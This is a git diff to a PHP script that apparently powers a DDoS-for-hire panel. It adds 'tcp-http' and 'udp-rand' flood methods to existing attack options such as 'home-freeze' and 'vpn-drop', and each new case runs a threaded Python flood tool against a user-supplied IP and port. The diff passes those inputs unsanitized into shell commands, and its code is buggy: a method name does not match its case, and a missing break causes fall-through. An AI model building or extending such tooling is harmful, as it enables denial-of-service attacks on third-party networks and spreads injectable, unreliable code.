@@ -5,7 +5,9 @@ $VALID_METHODS = [
     "udp-bypass",
     "home-freeze",
     "http-flood",
-    "vpn-drop"
+    "vpn-drop",
+    "tcp-http",
+    "udp-rand"
 ];
 
 ignore_user_abort(true);
@@ -86,6 +88,13 @@ else{
          
         case "home-freeze":
             $command = "cd ../c; ./tch $ip $port 250 1 $time";
+        
+        case "http-tcp":
+            $command = "python3 ../py/mix.py -ip $ip -port $port -time $time -protocol TCP -threads 50 -osilayer 7";
+        break;
+        
+        case "udp-rand":
+            $command = "python3 ../py/mix.py -ip $ip -port $port -time $time -protocol UDP -threads 50 -osilayer 4";
         break;  
     }
 
